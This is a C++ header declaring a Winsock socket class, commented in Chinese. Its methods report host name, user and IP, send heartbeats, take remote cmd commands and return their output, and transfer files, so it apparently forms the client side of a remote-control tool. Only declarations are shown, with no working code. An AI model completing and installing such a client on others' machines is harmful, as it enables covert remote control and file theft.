#pragma once

#include "pch.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS 

#include <Windows.h>
#include <WinSock2.h>

#define PacketMagic 0xdeadbeef
#define PCMSGSIZE 50
#define CMDSIZE 8192
#define FILEBUFFERLEN 2048
#define MAXFILESIZE (50*1024*1024)//50MB

struct PCMsg {
	char PCName[PCMSGSIZE];
	char UserName[PCMSGSIZE];
	char IP[PCMSGSIZE];
	UINT32 Magic;
};

struct HEARTBEAT {
	UINT32 Magic;
};

class MySocket {
private:
	// 临界区对象
	CRITICAL_SECTION criticalSection;
	// socket
	SOCKET sock;
	// 接收数据缓冲区
	void* pRecv;
	// 发送数据缓冲区
	void* pSend;
	// 互斥体，保证发送和接收不冲突
	HANDLE mutex;

public:
	// 初始化Socket
	bool SocketInit(CRITICAL_SECTION criticalSection);
	// 复制一个具有相同socket和mutex的类，用FreeCopy释放
	MySocket* New();
	// 释放复制的类
	void FreeCopy();
	// 释放原始的类
	void Free();
	// 连接
	bool Connect(const char* ip, u_short port);
	// TCHAR to char
	void TcharToChar(const TCHAR* tchar, char* _char);
	// 获取计算机信息
	PCMsg* GetPCMsg();
	// 发送PC信息
	bool SendMsg(PCMsg* msg);
	// 发送心跳包
	bool MySendHeartBeat();
	// 接收指令
	bool RecvIns(UINT32* Command);
	// 接收cmd指令
	bool RecvCommand(wchar_t* Command, char* buf);
	// 发送cmd结果
	bool SendResult(wchar_t* res, char* buf);
	// 创建文件
	bool WriteToFile(char* FileBuf, wchar_t* path);
	// 接收文件
	bool RecvFile(char* File, int len);
	// 读取文件
	int ReadFromFile(wchar_t* Path, UINT32* len, char** FileBuf);
	// 发送文件
	bool SendFile(char* File, int len);
	// 发送指令
	bool SendCommand(UINT32 command);
};

